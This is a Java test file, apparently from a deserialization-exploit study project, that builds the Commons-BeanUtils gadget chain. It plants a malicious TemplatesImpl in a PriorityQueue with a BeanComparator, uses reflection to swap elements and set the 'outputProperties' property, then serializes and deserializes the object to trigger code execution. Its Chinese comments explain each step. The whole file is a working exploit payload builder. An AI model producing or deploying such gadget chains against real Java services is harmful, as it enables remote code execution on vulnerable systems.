package Test_CB;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import expUtils.ExpUtils;
import expUtils.ReflectUtils;
import org.apache.commons.beanutils.BeanComparator;

import java.io.IOException;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class TestCB2 {
    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        //        第一步 准备恶意 templates
        TemplatesImpl templates = ExpUtils.getEvilTemplates();

//        第二步 使用 BeanComparator 作为传入 PriorityQueue 作为 comparator
        BeanComparator beanComparator = new BeanComparator();
        PriorityQueue priorityQueue = new PriorityQueue(2,beanComparator);
        priorityQueue.add(1);
        priorityQueue.add(1);


//        第三步 添加元素后再替换回 templates ，避免添加时触发代码执行
        Field queue =  ReflectUtils.getFields(priorityQueue,"queue");
        Object[] queueObj = (Object[]) queue.get(priorityQueue);
        queueObj[0] = templates;
        queueObj[1] = templates;
//        替换为 TemplatesImpl 中的 property
        ReflectUtils.setFields(beanComparator,"property","outputProperties");


        String path = ExpUtils.serialize(priorityQueue);
        ExpUtils.unserialize(path);

    }
}
